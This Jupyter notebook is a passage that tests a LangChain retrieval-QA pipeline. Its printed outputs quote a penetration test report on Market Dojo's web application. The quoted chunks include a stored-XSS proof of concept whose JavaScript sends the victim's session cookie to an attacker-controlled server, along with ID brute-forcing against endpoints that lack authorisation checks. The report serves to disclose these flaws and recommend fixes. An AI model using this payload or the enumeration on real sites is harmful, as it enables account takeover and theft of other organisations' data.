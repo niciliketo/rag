{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "42e19da3-4e41-4b49-a6e7-b8cf7a109cd7",
   "metadata": {},
   "outputs": [],
   "source": [
    "from dotenv import load_dotenv\n",
    "from langchain.embeddings import VertexAIEmbeddings\n",
    "load_dotenv()\n",
    "from fastapi import FastAPI\n",
    "from langchain.chains import RetrievalQA\n",
    "from langchain.chat_models import ChatVertexAI\n",
    "from langchain.embeddings import VertexAIEmbeddings\n",
    "from langchain.vectorstores import ElasticVectorSearch"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "6de9d8da-349c-41d6-89b5-a89fc459bb75",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/usr/local/lib/python3.10/site-packages/langchain/vectorstores/elastic_vector_search.py:143: UserWarning: ElasticVectorSearch will be removed in a future release. SeeElasticsearch integration docs on how to upgrade.\n",
      "  warnings.warn(\n"
     ]
    }
   ],
   "source": [
    "embeddings = VertexAIEmbeddings()\n",
    "db = ElasticVectorSearch(\n",
    "    elasticsearch_url=\"http://elasticsearch:9200\",\n",
    "    index_name=\"elastic-index\",\n",
    "    embedding=embeddings,\n",
    ")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "2887d378-2cc0-4e2c-9b18-45033e70186d",
   "metadata": {},
   "outputs": [],
   "source": [
    "qa = RetrievalQA.from_chain_type(\n",
    "    llm=ChatVertexAI(temperature=0),\n",
    "    chain_type=\"stuff\",\n",
    "    retriever=db.as_retriever(),\n",
    "    return_source_documents=True\n",
    ")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "95e61ec1-a167-46af-bc22-61c513643519",
   "metadata": {},
   "outputs": [],
   "source": [
    "query = \"What could a malicious user potentially do\"\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "4b186bba-e432-44f3-ba44-4ce44a3e5685",
   "metadata": {},
   "outputs": [],
   "source": [
    "    response = qa(query)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "eba046db-5e29-497e-b90e-860502f2373f",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'query': 'What could a malicious user potentially do',\n",
       " 'result': ' A malicious user could potentially view sensitive information of other organisations, or take over other superhost user accounts on the site. ',\n",
       " 'source_documents': [Document(page_content='An example of the results of a brute force attack is included in the screenshot below. In this attack, document ids between 1085000 and 1085999 were brute forced with event id 145 at the endpoint GET /simdojo/events/145/documents/<document id>, each responding with a valid document which belonged to a user from another organisation:\\n\\nFigure - Document brute force results: A response status code of 200 indicates that a document from another organisation was able to be accessed.\\n\\nRecommendation\\n\\nWe recommend adding an authorisation check at the aﬀected endpoint to ensure that the user requesting the document should be able to read the document.\\n\\nAffected Endpoint\\n\\nGET /simdojo/events/<event id>/documents/<document id>\\n\\nMarket Dojo Ltd. (M23-1042) Application and Organisation Penetration Test\\n\\nPage 7 of 16\\n\\nStored cross site scripting - MODERATE\\n\\nNIST CVSS 3.1 Scoring - Base Score: 5.5 CVSS Vector: AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L\\n\\nSummary\\n\\nA stored cross site scripting (XSS) vulnerability has been found in which a Host user can escalate to a SuperHost user.\\n\\nDetails\\n\\nA stored XSS vulnerability exists in the event title when an event is created in the sandpit environment of Sourcing Dojo through the endpoint POST /events. This vulnerability can be exploited such that a Host user is able to obtain the auth_headers cookie from the SuperHost user session, allowing the attacker to take over the browsing session of the other user.\\n\\nDuring testing, an exploit for this vulnerability was created as proof of concept. The steps to create this proof of concept exploit are detailed below, which allow the user test2@mercuryiss.com.au to take over the browsing session of the user test1@mercuryiss.com.au by creating an event with a malicious payload embedded in the title of the event.\\n\\nIn the ﬁrst step of the exploit, test2 created an event with an HTML script tag embedded in the title of the event, with the source of the script being http://localhost:8000/x.js:\\n\\nFigure - An event is created with a Javascript script tag in the title\\n\\nNext, the malicious script x.js is created and hosted on a web server at the URL http://localhost:8000/x.js. The Javascript code for the script is included below. The code reads the session cookies from the user and sends it to the attacker.\\n\\nvar sessionId = document.cookie;\\n\\nMarket Dojo Ltd. (M23-1042) Application and Organisation Penetration Test\\n\\nPage 8 of 16\\n\\nvar http = new XMLHttpRequest(); http.setRequestHeader(\"cookie\", sessionId); http.open(\"GET\", \"http://localhost:5555/session?creds=\" + sessionId); http.send();\\n\\nFigure - The Javascript code for x.js\\n\\nWhen test1 visits the Sourcing Dojo dashboard (https://mercury1.marketdojo.com/sourcing_dashboard), their browser interprets the event title as an HTML script tag, reads x.js from the attacker’s web server and then executes x.js, sending test1’s session cookie to the attacker, allowing the attacker to take over their session and account.\\n\\nThe output of the attacker’s web server is included below. Highlighted is the auth_headers cookie required for account takeover.\\n\\nFigure - When test1 visits the sourcing dashboard page, the embedded script sends their cookie to the attacker-controlled web server.\\n\\nRecommendation\\n\\nWe recommend sanitising user input ﬁelds at the aﬀected endpoint POST /events. This can be achieved by ﬁltering out special characters that could be used to inject Javascript such as “>” and “<”.\\n\\nThe following document outlines some means of cross-site scripting prevention:\\n\\nhttps://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet\\n\\nIn the instance of cross site scripting identiﬁed, simply limiting inputs to numbers, letters and spaces will signiﬁcantly reduce the attack surface.', metadata={'source': '/app/data/Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf'}),\n",
       "  Document(page_content='Web application testing consisted of analysis of the web application and its functionality following the OWASP web security testing guide, with a focus on access control, input validation and business logic. Credentials for user, host and superhost type accounts were provided for the web application so that user access control issues could be tested.\\n\\nTesting of the web application revealed some access control issues which allow a user to view documents that don’t belong to them. The access control issues identiﬁed during testing were the following:\\n\\nBroken access control on zipped documents - HIGH ● Broken access control on documents - HIGH\\n\\nIn view of these access control issues being discovered, we recommend that testing for access control issues be integrated into the software development lifecycle.\\n\\nAdditionally, a stored cross-site scripting vulnerability was found which allows a user to take over the session of another user who visits the page with the stored Javascript: Stored cross site scripting - MODERATE. We recommend that Market Dojo takes more care with user input to ensure that users cannot inject Javascript into web pages.\\n\\nExternal Penetration Test\\n\\nExternal testing consisted of an initial reconnaissance phase against the Market Dojo top level DNS name, followed by manual and automated testing against the discovered hosts, web content discovery brute forcing, and password-based attacks against login endpoints.\\n\\nThe external, internet-facing infrastructure was found to be well-secured, with no ﬁndings of moderate severity or above. However, some low severity ﬁndings were discovered during the assessment, which have been summarised below:\\n\\nInvalid SSL/TLS certiﬁcates - LOW ● HTTP Strict Transport Security not enforced - LOW\\n\\nThese conﬁguration-related vulnerabilities would allow an attacker with a person-in-the-middle position to read and modify data sent to/from users.\\n\\nMarket Dojo Ltd. (M23-1042) Application and Organisation Penetration Test\\n\\nPage 5 of 16\\n\\nPenetration Test Findings\\n\\nBroken access control on zipped documents - HIGH\\n\\nNIST CVSS 3.1 Scoring - Base Score: 6.5 CVSS Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N\\n\\nSummary\\n\\nUsers can view documents which belong to other users and organisations, exposing sensitive information.\\n\\nDetails\\n\\nIn Sourcing Dojo, a user can download a zip ﬁle containing all documents associated with an event by sending a request to the endpoint GET /events/<event id>/documents/zipped_documents. During testing it was found that there are no authorisation checks on this URL, allowing a user to brute force the event id to view the documents which belong to other organisations, exposing sensitive information.\\n\\nAn example of the results of a brute force attack is included in the screenshot below. In this attack, event ids between 60000 and 60999 were brute forced by the user test3@mercuryiss.com.au, each responding with a valid zip ﬁle containing documents which belonged to another organisation:\\n\\nFigure - Zipped document brute force results: A response status code of 200 indicates that a zip ﬁle containing documents which belong to another organisation was able to be accessed.\\n\\nRecommendation\\n\\nWe recommend adding an authorisation check at the aﬀected endpoint to ensure that the user requesting the zipped documents should be able to read the documents.\\n\\nAffected Endpoint\\n\\nGET /simdojo/events/<event id>/documents/<document id>\\n\\nMarket Dojo Ltd. (M23-1042) Application and Organisation Penetration Test\\n\\nPage 6 of 16\\n\\nBroken access control on documents - HIGH\\n\\nNIST CVSS 3.1 Scoring - Base Score: 6.5 CVSS Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N\\n\\nSummary\\n\\nSuperhosts users can view documents which belong to other organisations, exposing sensitive information.\\n\\nDetails\\n\\nIn SIMdojo, a superhost can view a document associated with an onboarding event by sending a request to the endpoint GET /simdojo/events/<event id>/documents/<document id>. During testing it was found that there are authorisation checks for superhost users on this URL, allowing a superhost user to brute force the document id to view the documents which belong to other organisations, exposing sensitive information.', metadata={'source': '/app/data/Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf'}),\n",
       "  Document(page_content=\"Market Dojo Ltd. (M23-1042) Application and Organisation Penetration Test\\n\\nPage 14 of 16\\n\\nAppendix A: Project Management\\n\\nAssumptions and Limitations\\n\\nPenetration tests are designed to evaluate vulnerabilities and validate the eﬀectiveness of security controls by analysing the target environment’s responses to known attack methods, and actions that are typically used to attack organisations, their applications and their computer assets.\\n\\nDue to their nature and the proposed scope of this review, the following assumptions and limitations were applied:\\n\\nThis review sought to identify point issues or systemic issues through analysis in lieu of providing an exhaustive list of vulnerabilities.\\n\\nThe scope of the review was limited to the proposal and days available for testing. Where possible, Mercury has prioritised its review to ensure an economy of eﬀort and provided guidance on the future allocation of security activities.\\n\\nTechnology and security is an evolving ﬁeld. This review sought to assess the state of an environment at a speciﬁc point in time. Should changes to the threat landscape or the organisation’s application take place, Market Dojo Ltd. should evaluate whether these pose a risk to the organisation or the application. Technical recommendations provided in the report body should serve as a guide only. Your organisation’s environment, larger than the scope of this engagement, should serve as context for our recommendations; internal constraints and other impacts should be considered during their implementation.\\n\\nRisk Rating Methodology\\n\\nMercury employs the Common Vulnerability Disclosure System (CVSS) to evaluate risk. CVSS assigns severity scores to vulnerabilities based on qualiﬁed metrics against the following groups:\\n\\nThe Base group represents the intrinsic qualities of a vulnerability that are constant over time and across user environments. E.g. Exploitability metrics and Impact metrics.\\n\\nThe Temporal group reﬂects the characteristics of a vulnerability that change over time. ● The Environmental group represents the characteristics of a vulnerability that are unique to a user's environment.\\n\\nThe Base metrics produce a score ranging from 0 to 10, which can then be modiﬁed by scoring the Temporal and Environmental metrics. These values are placed against qualitative ratings of LOW, MEDIUM, HIGH and CRITICAL.\\n\\nSubsequent details on CVSS Are available via the National Institute of Sciences and Technology (https://nvd.nist.gov/vuln-metrics/cvss)\\n\\nMarket Dojo Ltd. (M23-1042) Application and Organisation Penetration Test\\n\\nPage 15 of 16\\n\\nAbout Mercury\\n\\nMercury Information Security Services is a leading provider of information security services, advice and consulting in Australia.\\n\\nFounded in 2015, Mercury provides cyber security assessment, advisory and research services.\\n\\nFor more information, visit their website or get in contact with them:\\n\\nWebsite: Twitter: Email:\\n\\nwww.mercuryiss.com.au twitter.com/mercuryiss info@mercuryiss.com.au\\n\\nMercury is a CREST Member company\\n\\nMarket Dojo Ltd. (M23-1042) Application and Organisation Penetration Test\\n\\nPage 16 of 16\", metadata={'source': '/app/data/Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf'}),\n",
       "  Document(page_content='Application and Organisation Penetration Test\\n\\nCreated for:\\n\\nNicholas Martin, Market Dojo Ltd.\\n\\nWritten by:\\n\\nMaleehah Lohani, Sam Lazarus\\n\\nVersion:\\n\\n1.0\\n\\nReference:\\n\\nM23-1042\\n\\nDate:\\n\\n8th of May 2023\\n\\nTable of Contents\\n\\nTable of Contents\\n\\nDocument Control Executive Summary\\n\\nKey Findings Recommendations\\n\\nApplication and Organisation Penetration Test\\n\\nEngagement Details\\n\\nSummary\\n\\nWeb Application Test External Penetration Test\\n\\nPenetration Test Findings\\n\\nBroken access control on zipped documents - HIGH\\n\\nBroken access control on documents - HIGH Stored cross site scripting - MODERATE\\n\\nPassword hash exposure - MODERATE\\n\\nInvalid TLS certiﬁcates - LOW\\n\\nHTTP Strict Transport Security not enforced - LOW\\n\\nLack of Content Security Policy - INFORMATIONAL\\n\\nNetwork services publicly exposed - INFORMATIONAL\\n\\nAppendix A: Project Management\\n\\nAssumptions and Limitations\\n\\nRisk Rating Methodology\\n\\nAbout Mercury\\n\\nMarket Dojo Ltd. (M23-1042) Application and Organisation Penetration Test\\n\\n2\\n\\n3 4\\n\\n4 4 5\\n\\n5\\n\\n5\\n\\n5 5\\n\\n6\\n\\n6\\n\\n7 8\\n\\n10\\n\\n11\\n\\n12\\n\\n13\\n\\n14\\n\\n15\\n\\n15\\n\\n15\\n\\n16\\n\\nPage 2 of 16\\n\\nDocument Control\\n\\nVersion\\n\\nDate\\n\\nAuthor\\n\\n0.1\\n\\n1 May 2023\\n\\nMaleehah Lohani, Sam Lazarus\\n\\n0.2\\n\\n8 May 2023\\n\\nEdward Farrell, Sam Lazarus\\n\\n1.0\\n\\n8 May 2023\\n\\nEdward Farrell\\n\\nMarket Dojo Ltd. (M23-1042) Application and Organisation Penetration Test\\n\\nComments\\n\\nOriginated\\n\\nPeer Review\\n\\nRelease\\n\\nPage 3 of 16\\n\\nExecutive Summary\\n\\nMarket Dojo is a SaaS software solution for procurement professionals that provides their customers with the opportunity to centralise their information and negotiate the best value for goods and services.\\n\\nRecommendations\\n\\nImmediate Actions\\n\\nMarket Dojo has sought a web application and an external penetration test to assess and assure its digital assets are secured. Mercury Information Security Services (Mercury) has conducted a penetration test of which the ﬁndings have been detailed below.\\n\\nKey Findings\\n\\nImplement the recommended ﬁxes for the high severity access control issues detailed in the ﬁndings section below. The ﬁxes would involve adding authorisation checks at the aﬀected endpoints.\\n\\nImplement the recommended ﬁx for the cross-site scripting vulnerability detailed below, which would require adding user input sanitisation at the aﬀected endpoint.\\n\\nThe external, internet-facing infrastructure of Market Dojo is generally well secured, with all of the vulnerabilities related to the external environment being of low risk. However, some high severity access control related vulnerabilities were discovered in the web application which would allow a malicious user to retrieve sensitive information of other organisations. Additionally, a cross-site scripting vulnerability was found which would allow a malicious user to take over other superhost user accounts on the site.\\n\\nThe table above illustrates the number and severity of issues.\\n\\nOngoing Activities\\n\\nWe recommend that the access control and cross-site scripting vulnerabilities are tested more thoroughly during the software development lifecycle, which will help to prevent these vulnerabilities from being introduced into the application.\\n\\nAdditionally, we would recommend incorporating application source code review into penetration tests performed in the future. Application source code review can help to reveal vulnerabilities that the usual “black box” style testing cannot.\\n\\nMarket Dojo Ltd. (M23-1042) Application and Organisation Penetration Test\\n\\nPage 4 of 16\\n\\nApplication and Organisation Penetration Test\\n\\nEngagement Details\\n\\nDates:\\n\\nTuesday, 17 April 2023 to Thursday, 20 April 2023\\n\\nTargets:\\n\\nWeb Application: https://sourcing.marketdojo.com/users/sign_in\\n\\nExternal: *.marketdojo.com\\n\\nOrigin IP:\\n\\n52.62.158.131\\n\\nSummary\\n\\nThe areas of focus for this assessment were the Market Dojo web application and the Market Dojo internet-facing external infrastructure.\\n\\nWeb Application Test', metadata={'source': '/app/data/Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf'})]}"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "response"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "f6e56138-95c3-4ceb-b6a0-eb1fcaffa8b9",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/app/data/Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf'"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "response['source_documents'][2].metadata['source']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "a4d206fe-0aa9-4506-a073-a5460107aa10",
   "metadata": {},
   "outputs": [],
   "source": [
    "results = [doc.metadata['source'] for doc in response['source_documents']]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "ee51e287-59a5-4192-a26e-0f141a1bade3",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['/app/data/Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf',\n",
       " '/app/data/Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf',\n",
       " '/app/data/Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf',\n",
       " '/app/data/Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf']"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "results"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "69ab3f2d-3674-4c17-8284-2f1e93362f41",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'/app/data/Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf'}"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "set(results)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "1ddf5ae2-3962-4740-ace8-9bf566de0099",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os.path\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "2b6c4ddc-fb45-4ead-8a02-b4e71d5121a1",
   "metadata": {},
   "outputs": [],
   "source": [
    "results = [os.path.basename(doc.metadata['source']) for doc in response['source_documents']]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "eae337ba-9bad-4b60-a114-47af63513d7f",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf',\n",
       " 'Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf',\n",
       " 'Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf',\n",
       " 'Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf']"
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "results"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "13efc4e0-1eb5-4c70-82db-ac32029a1033",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf'}"
      ]
     },
     "execution_count": 33,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "set(results)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "61539c79-b8ad-45ae-b849-8a38e1067739",
   "metadata": {},
   "outputs": [],
   "source": [
    "sources = [os.path.basename(doc.metadata['source']) for doc in response['source_documents']]\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "a2740841-cc6f-4a31-b0b0-336bb5726ec2",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf',\n",
       " 'Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf',\n",
       " 'Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf',\n",
       " 'Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf']"
      ]
     },
     "execution_count": 35,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sources"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "edaf909b-2a60-42fb-9c4c-c845e8d835ad",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf'}"
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sources = set(os.path.basename(doc.metadata['source']) for doc in response['source_documents'])\n",
    "sources"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "id": "a2a8952d-0db0-498f-97db-12e092a7228b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf',\n",
       " 'Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf',\n",
       " 'Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf',\n",
       " 'Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf']"
      ]
     },
     "execution_count": 37,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "list(os.path.basename(doc.metadata['source']) for doc in response['source_documents'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "id": "1fc0b2f9-78f9-4d4c-aca0-7bb0e3b84cfa",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf']"
      ]
     },
     "execution_count": 38,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "list(set(os.path.basename(doc.metadata['source']) for doc in response['source_documents']))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "id": "a0adfaa4-d2f5-4759-87e5-8e85f3eab5c5",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'query': 'What could a malicious user potentially do',\n",
       " 'result': ' A malicious user could potentially view sensitive information of other organisations, or take over other superhost user accounts on the site. ',\n",
       " 'source_documents': [Document(page_content='An example of the results of a brute force attack is included in the screenshot below. In this attack, document ids between 1085000 and 1085999 were brute forced with event id 145 at the endpoint GET /simdojo/events/145/documents/<document id>, each responding with a valid document which belonged to a user from another organisation:\\n\\nFigure - Document brute force results: A response status code of 200 indicates that a document from another organisation was able to be accessed.\\n\\nRecommendation\\n\\nWe recommend adding an authorisation check at the aﬀected endpoint to ensure that the user requesting the document should be able to read the document.\\n\\nAffected Endpoint\\n\\nGET /simdojo/events/<event id>/documents/<document id>\\n\\nMarket Dojo Ltd. (M23-1042) Application and Organisation Penetration Test\\n\\nPage 7 of 16\\n\\nStored cross site scripting - MODERATE\\n\\nNIST CVSS 3.1 Scoring - Base Score: 5.5 CVSS Vector: AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L\\n\\nSummary\\n\\nA stored cross site scripting (XSS) vulnerability has been found in which a Host user can escalate to a SuperHost user.\\n\\nDetails\\n\\nA stored XSS vulnerability exists in the event title when an event is created in the sandpit environment of Sourcing Dojo through the endpoint POST /events. This vulnerability can be exploited such that a Host user is able to obtain the auth_headers cookie from the SuperHost user session, allowing the attacker to take over the browsing session of the other user.\\n\\nDuring testing, an exploit for this vulnerability was created as proof of concept. The steps to create this proof of concept exploit are detailed below, which allow the user test2@mercuryiss.com.au to take over the browsing session of the user test1@mercuryiss.com.au by creating an event with a malicious payload embedded in the title of the event.\\n\\nIn the ﬁrst step of the exploit, test2 created an event with an HTML script tag embedded in the title of the event, with the source of the script being http://localhost:8000/x.js:\\n\\nFigure - An event is created with a Javascript script tag in the title\\n\\nNext, the malicious script x.js is created and hosted on a web server at the URL http://localhost:8000/x.js. The Javascript code for the script is included below. The code reads the session cookies from the user and sends it to the attacker.\\n\\nvar sessionId = document.cookie;\\n\\nMarket Dojo Ltd. (M23-1042) Application and Organisation Penetration Test\\n\\nPage 8 of 16\\n\\nvar http = new XMLHttpRequest(); http.setRequestHeader(\"cookie\", sessionId); http.open(\"GET\", \"http://localhost:5555/session?creds=\" + sessionId); http.send();\\n\\nFigure - The Javascript code for x.js\\n\\nWhen test1 visits the Sourcing Dojo dashboard (https://mercury1.marketdojo.com/sourcing_dashboard), their browser interprets the event title as an HTML script tag, reads x.js from the attacker’s web server and then executes x.js, sending test1’s session cookie to the attacker, allowing the attacker to take over their session and account.\\n\\nThe output of the attacker’s web server is included below. Highlighted is the auth_headers cookie required for account takeover.\\n\\nFigure - When test1 visits the sourcing dashboard page, the embedded script sends their cookie to the attacker-controlled web server.\\n\\nRecommendation\\n\\nWe recommend sanitising user input ﬁelds at the aﬀected endpoint POST /events. This can be achieved by ﬁltering out special characters that could be used to inject Javascript such as “>” and “<”.\\n\\nThe following document outlines some means of cross-site scripting prevention:\\n\\nhttps://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet\\n\\nIn the instance of cross site scripting identiﬁed, simply limiting inputs to numbers, letters and spaces will signiﬁcantly reduce the attack surface.', metadata={'source': '/app/data/Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf'}),\n",
       "  Document(page_content='Web application testing consisted of analysis of the web application and its functionality following the OWASP web security testing guide, with a focus on access control, input validation and business logic. Credentials for user, host and superhost type accounts were provided for the web application so that user access control issues could be tested.\\n\\nTesting of the web application revealed some access control issues which allow a user to view documents that don’t belong to them. The access control issues identiﬁed during testing were the following:\\n\\nBroken access control on zipped documents - HIGH ● Broken access control on documents - HIGH\\n\\nIn view of these access control issues being discovered, we recommend that testing for access control issues be integrated into the software development lifecycle.\\n\\nAdditionally, a stored cross-site scripting vulnerability was found which allows a user to take over the session of another user who visits the page with the stored Javascript: Stored cross site scripting - MODERATE. We recommend that Market Dojo takes more care with user input to ensure that users cannot inject Javascript into web pages.\\n\\nExternal Penetration Test\\n\\nExternal testing consisted of an initial reconnaissance phase against the Market Dojo top level DNS name, followed by manual and automated testing against the discovered hosts, web content discovery brute forcing, and password-based attacks against login endpoints.\\n\\nThe external, internet-facing infrastructure was found to be well-secured, with no ﬁndings of moderate severity or above. However, some low severity ﬁndings were discovered during the assessment, which have been summarised below:\\n\\nInvalid SSL/TLS certiﬁcates - LOW ● HTTP Strict Transport Security not enforced - LOW\\n\\nThese conﬁguration-related vulnerabilities would allow an attacker with a person-in-the-middle position to read and modify data sent to/from users.\\n\\nMarket Dojo Ltd. (M23-1042) Application and Organisation Penetration Test\\n\\nPage 5 of 16\\n\\nPenetration Test Findings\\n\\nBroken access control on zipped documents - HIGH\\n\\nNIST CVSS 3.1 Scoring - Base Score: 6.5 CVSS Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N\\n\\nSummary\\n\\nUsers can view documents which belong to other users and organisations, exposing sensitive information.\\n\\nDetails\\n\\nIn Sourcing Dojo, a user can download a zip ﬁle containing all documents associated with an event by sending a request to the endpoint GET /events/<event id>/documents/zipped_documents. During testing it was found that there are no authorisation checks on this URL, allowing a user to brute force the event id to view the documents which belong to other organisations, exposing sensitive information.\\n\\nAn example of the results of a brute force attack is included in the screenshot below. In this attack, event ids between 60000 and 60999 were brute forced by the user test3@mercuryiss.com.au, each responding with a valid zip ﬁle containing documents which belonged to another organisation:\\n\\nFigure - Zipped document brute force results: A response status code of 200 indicates that a zip ﬁle containing documents which belong to another organisation was able to be accessed.\\n\\nRecommendation\\n\\nWe recommend adding an authorisation check at the aﬀected endpoint to ensure that the user requesting the zipped documents should be able to read the documents.\\n\\nAffected Endpoint\\n\\nGET /simdojo/events/<event id>/documents/<document id>\\n\\nMarket Dojo Ltd. (M23-1042) Application and Organisation Penetration Test\\n\\nPage 6 of 16\\n\\nBroken access control on documents - HIGH\\n\\nNIST CVSS 3.1 Scoring - Base Score: 6.5 CVSS Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N\\n\\nSummary\\n\\nSuperhosts users can view documents which belong to other organisations, exposing sensitive information.\\n\\nDetails\\n\\nIn SIMdojo, a superhost can view a document associated with an onboarding event by sending a request to the endpoint GET /simdojo/events/<event id>/documents/<document id>. During testing it was found that there are authorisation checks for superhost users on this URL, allowing a superhost user to brute force the document id to view the documents which belong to other organisations, exposing sensitive information.', metadata={'source': '/app/data/Market Dojo (M23-1042) Application and Organisation Penetration Test.pdf'}),\n",
       "  Document(page_content=\"Market Dojo Ltd. (M23-1042) Application and Organisation Penetration Test\\n\\nPage 14 of 16\\n\\nAppendix A: Project Management\\n\\nAssumptions and Limitations\\n\\nPenetration tests are designed to evaluate vulnerabilities and validate the eﬀectiveness of security controls by analysing the target environment’s responses to known attack methods, and actions that are typically used to attack organisations, their applications and their computer assets.\\n\\nDue to their nature and the proposed scope of this review, the following assumptions and limitations were applied:\\n\\nThis review sought to identify point issues or systemic issues through analysis in lieu of providing an exhaustive list of vulnerabilities.\\n\\nThe scope of the review was limited to the proposal and days available for testing. Where possible, Mercury has prioritised its review to ensure an economy of eﬀort and provided guidance on the future allocation of security activities.\\n\\nTechnology and security is an evolving ﬁeld. This review sought to assess the state of an environment at a speciﬁc point in time. Should changes to the threat landscape or the organisation’s application take place, Market Dojo Ltd. should evaluate whether these pose a risk to the organisation or the application. Technical recommendations provided in the report body should serve as a guide only. Your organisation’s environment, larger than the scope of this engagement, should serve as context for our recommendations; internal constraints and other impacts should be considered during their implementation.\\n\\nRisk Rating Methodology\\n\\nMercury employs the Common Vulnerability Disclosure System (CVSS) to evaluate risk. CVSS assigns severity scores to vulnerabilities based on qualiﬁed metrics against the following groups:\\n\\nThe Base group represents the intrinsic qualities of a vulnerability that are constant over time and across user environments. E.g. Exploitability metrics and Impact metrics.\\n\\nThe Temporal group reﬂects the characteristics of a vulnerability that change over time. ● The Environmental group represents the characteristics of a vulnerability that are unique to a user's environment.\\n\\nThe Base metrics produce a score ranging from 0 to 10, which can then be modiﬁed by scoring the Temporal and Environmental metrics. These values are placed against qualitative ratings of LOW, MEDIUM, HIGH and CRITICAL.\\n\\nSubsequent details on CVSS Are available via the National Institute of Sciences and Technology (https://nvd.nist.gov/vuln-metrics/cvss)\\n\\nMarket Dojo Ltd. (M23-1042) Application and Organisation Penetration Test\\n\\nPage 15 of 16\\n\\nAbout Mercury\\n\\nMercury Information Security Services is a leading provider of information security services, advice and consulting in Australia.\\n\\nFounded in 2015, Mercury provides cyber security assessment, advisory and research services.\\n\\nFor more information, visit their website or get in contact with them:\\n\\nWebsite: Twitter: Email:\\n\\nwww.mercuryiss.com.au twitter.com/mercuryiss info@mercuryiss.com.au\\n\\nMercury is a CREST Member company\\n\\nMarket Dojo Ltd. (M23-1042) Application and Organisation Penetration 